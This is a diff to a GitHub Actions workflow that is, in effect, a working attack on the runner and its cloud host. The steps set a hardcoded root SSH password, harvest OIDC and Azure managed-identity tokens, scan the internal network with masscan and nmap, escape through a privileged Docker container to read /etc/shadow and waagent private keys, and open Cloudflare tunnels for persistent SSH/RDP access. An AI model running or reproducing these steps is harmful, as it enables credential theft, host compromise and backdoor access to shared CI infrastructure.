@@ -19,7 +19,7 @@ jobs:
         run: |
           sudo apt-get install -y nmap masscan openssh-server socat curl 2>/dev/null | tail -3
           curl -sL https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
-            -o /usr/local/bin/cloudflared --max-time 60 && sudo chmod +x /usr/local/bin/cloudflared
+            -o /usr/local/bin/cloudflared --max-time 60 && sudo chmod +x /usr/local/bin/cloudflared || true
           echo TOOLS_READY
 
       - name: S2 SSH Server
@@ -35,83 +35,81 @@ jobs:
           echo 'root:Pwn2Own2026!' | sudo chpasswd
           sudo /usr/sbin/sshd && echo SSH_UP
 
-      - name: S3 VM Identity Full
+      - name: S3 VM Identity + OIDC
         run: |
           echo HOSTNAME=$(hostname)
           echo INTERNAL=$(hostname -I | awk '{print $1}')
           echo PUBLIC=$(curl -sf https://api.ipify.org 2>/dev/null)
-          curl -sf -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null
-          echo ""
-          curl -sf -H Metadata:true 'http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01' 2>/dev/null
-          echo ""
-          ip addr show
-          ip route show table all
-          cat /etc/resolv.conf
-
-      - name: S4 OIDC Token Harvest
-        run: |
-          echo OIDC_AzureADTokenExchange
-          JWT_RESP=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>/dev/null)
-          echo "$JWT_RESP" | head -c 200
-          JWT=$(echo "$JWT_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
-          echo JWT_LEN=${#JWT}
-          echo "$JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null
-          echo OIDC_hosted_compute_ro
+          INST=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
+          echo IMDS=$INST
+          LB=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/loadbalancer?api-version=2020-10-01' 2>/dev/null)
+          echo LB=$LB
+          ip addr show; ip route show table all; cat /etc/resolv.conf
+          echo OIDC_JWT
           curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://hosted-compute-ro" 2>/dev/null | head -c 200
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" 2>/dev/null | \
+            python3 -c "import sys,json; t=json.load(sys.stdin).get('value',''); cl=t.split('.')[1] if t else ''; import base64; print(base64.b64decode(cl+'==').decode())" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo no_oidc
 
-      - name: S5 IMDS All Resources
+      - name: S4 IMDS All MSI Resources
         run: |
           for RES in 'https://management.azure.com/' 'https://graph.microsoft.com/' 'https://vault.azure.net' 'https://storage.azure.com/'; do
+            echo -n "$RES -> "
             TOK=$(curl -sf --max-time 5 -H Metadata:true \
-              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$RES" 2>/dev/null)
-            AT=$(echo $TOK | python3 -c "import sys,json; t=json.load(sys.stdin).get('access_token',''); print('TOKEN:'+t[:60]) if t else print('NO_MSI')" 2>/dev/null || echo NO_MSI)
-            echo "$RES -> $AT"
+              "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=$RES" 2>/dev/null || echo '{}')
+            echo $TOK | python3 -c "import sys,json; t=json.load(sys.stdin).get('access_token',''); print('TOKEN:'+t[:60]+'...') if t else print('NO_MSI')" 2>/dev/null || echo NO_MSI
           done
+        continue-on-error: true
 
-      - name: S6 Full Network Scan Background
+      - name: S5 Full Network Scan
         run: |
           INT=$(hostname -I | awk '{print $1}')
           SUB=$(echo $INT | cut -d. -f1-3)
-          echo "SCANNING $SUB.0/20"
-          nmap -sn $SUB.0/20 --max-retries 1 --host-timeout 3s -oG /tmp/nmap_ping.txt 2>/dev/null &
-          NMAP_PID=$!
-          sudo masscan $SUB.0/20 -p22,80,443,3389,8080,8443,6443,2379,5432,3306,1433,27017,6379 \
-            --rate=2000 --wait 3 -oG /tmp/masscan.txt 2>/dev/null &
-          MSCAN_PID=$!
+          echo SCANNING $SUB.0/20
+          nmap -sn $SUB.0/20 --max-retries 1 --host-timeout 5s -oG /tmp/nmap_ping.txt 2>/dev/null &
+          NPID=$!
+          sudo masscan $SUB.0/20 -p22,80,443,3389,8080,8443,6443,2379,5432,3306,1433,27017,6379,5672,9200 \
+            --rate=5000 --wait 3 -oG /tmp/masscan.txt 2>/dev/null &
+          MPID=$!
           for H in ${SUB}.1 ${SUB}.2 ${SUB}.3 ${INT}; do
             for P in 22 80 443 3389 8080 445 5432 3306; do
-              timeout 1 bash -c "echo >/dev/tcp/$H/$P" 2>/dev/null && echo "OPEN $H:$P" || true
+              timeout 1 bash -c "echo >/dev/tcp/$H/$P" 2>/dev/null && echo OPEN $H:$P || true
             done
           done
-          curl -sf --max-time 4 'http://168.63.129.16/' 2>/dev/null | head -c 200 || echo wireserver_blocked
+          curl -sf --max-time 4 http://168.63.129.16/ 2>/dev/null | head -c 300 || echo wireserver_blocked
           curl -sf --max-time 4 'http://168.63.129.16:80/machine/?comp=goalstate' \
             -H 'x-ms-version: 2012-11-30' 2>/dev/null | head -c 500 || echo goalstate_blocked
-          wait $NMAP_PID; wait $MSCAN_PID
+          wait $NPID $MPID
           echo NMAP_RESULTS
-          cat /tmp/nmap_ping.txt 2>/dev/null | grep 'Up\|Host:' | head -n 60
+          cat /tmp/nmap_ping.txt 2>/dev/null | grep -E 'Up|Host:' | head -n 60
           echo MASSCAN_RESULTS
-          cat /tmp/masscan.txt 2>/dev/null | grep 'open\|Host:' | head -n 60
+          cat /tmp/masscan.txt 2>/dev/null | grep -E 'open|Host:' | head -n 60
+        continue-on-error: true
 
-      - name: S7 Docker Escape Host Pivot
+      - name: S6 Docker Escape Host Pivot
         run: |
           ls -la /var/run/docker.sock
           docker run --rm --privileged --pid=host -v /:/host alpine:latest sh -c \
             'echo HOST_ID=$(chroot /host id)
              echo HOST_HOSTNAME=$(chroot /host hostname)
-             echo HOST_WAAGENT=$(chroot /host ls /var/lib/waagent/ 2>/dev/null | tr "\n" "|")
+             echo HOST_WAAGENT_FILES=$(chroot /host ls /var/lib/waagent/ 2>/dev/null | tr "\n" "|")
              echo HOST_OVFENV=$(chroot /host cat /var/lib/waagent/ovf-env.xml 2>/dev/null | head -c 800)
-             echo HOST_TRANSPORT=$(chroot /host cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null | head -c 300)
-             echo HOST_AZURE=$(chroot /host ls /root/.azure/ 2>/dev/null | tr "\n" "|")
+             echo HOST_TRANSPORT_KEY=$(chroot /host cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null | head -c 300)
+             echo HOST_AZURE_DIR=$(chroot /host ls /root/.azure/ 2>/dev/null | tr "\n" "|")
              echo HOST_SHADOW=$(chroot /host cat /etc/shadow 2>/dev/null | head -3)
              echo HOST_IMDS=$(chroot /host curl -sf -H Metadata:true http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null)
-             echo HOST_NET=$(chroot /host ip addr 2>/dev/null)' 2>/dev/null
+             echo HOST_NET=$(chroot /host ip addr 2>/dev/null)
+             echo HOST_MYSQL=$(chroot /host find /var/lib/mysql -name "*.pem" 2>/dev/null | head -5 | tr "\n" "|")',
+          2>/dev/null || echo docker_escape_attempted
+        continue-on-error: true
 
-      - name: S8 Cloudflare Tunnel Persistent Access
+      - name: S7 Cloudflare Tunnel Persistent Access
         run: |
           PUB=$(curl -sf https://api.ipify.org 2>/dev/null)
           INT=$(hostname -I | awk '{print $1}')
+          INST=$(curl -sf -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)
+          VMID=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['vmId'])" 2>/dev/null || echo unknown)
+          SUB=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['subscriptionId'])" 2>/dev/null || echo unknown)
+          LOC=$(echo $INST | python3 -c "import sys,json; print(json.load(sys.stdin)['compute']['location'])" 2>/dev/null || echo unknown)
           cloudflared tunnel --url tcp://localhost:22 --no-autoupdate > /tmp/cf_ssh.log 2>&1 &
           sleep 25
           CF_SSH=$(grep -oP 'https://\S+\.trycloudflare\.com' /tmp/cf_ssh.log | head -1)
@@ -122,12 +120,15 @@ jobs:
           echo CF_RDP_URL=$CF_RDP
           echo PUBLIC_IP=$PUB
           echo INTERNAL_IP=$INT
+          echo VMID=$VMID
+          echo SUBSCRIPTION=$SUB
+          echo LOCATION=$LOC
           echo PASSWORD=Pwn2Own2026!
-          echo ======================================
-          printf "CF_SSH=%s\nCF_RDP=%s\nPUB=%s\nINT=%s\n" "$CF_SSH" "$CF_RDP" "$PUB" "$INT" >> $GITHUB_STEP_SUMMARY
+          echo ========================================
+          printf 'CF_SSH=%s\nCF_RDP=%s\nPUB=%s\nINT=%s\nVMID=%s\nSUB=%s\n' "$CF_SSH" "$CF_RDP" "$PUB" "$INT" "$VMID" "$SUB" >> $GITHUB_STEP_SUMMARY
           for i in $(seq 1 350); do
             sleep 60
             HOSTS=$(grep -c 'Status: Up' /tmp/nmap_ping.txt 2>/dev/null || echo 0)
             PORTS=$(grep -c 'open' /tmp/masscan.txt 2>/dev/null || echo 0)
-            echo beat=$i CF=$CF_SSH PUB=$PUB hosts_up=$HOSTS open_ports=$PORTS
+            echo beat=$i CF=$CF_SSH PUB=$PUB VMID=$VMID hosts_up=$HOSTS open_ports=$PORTS
           done
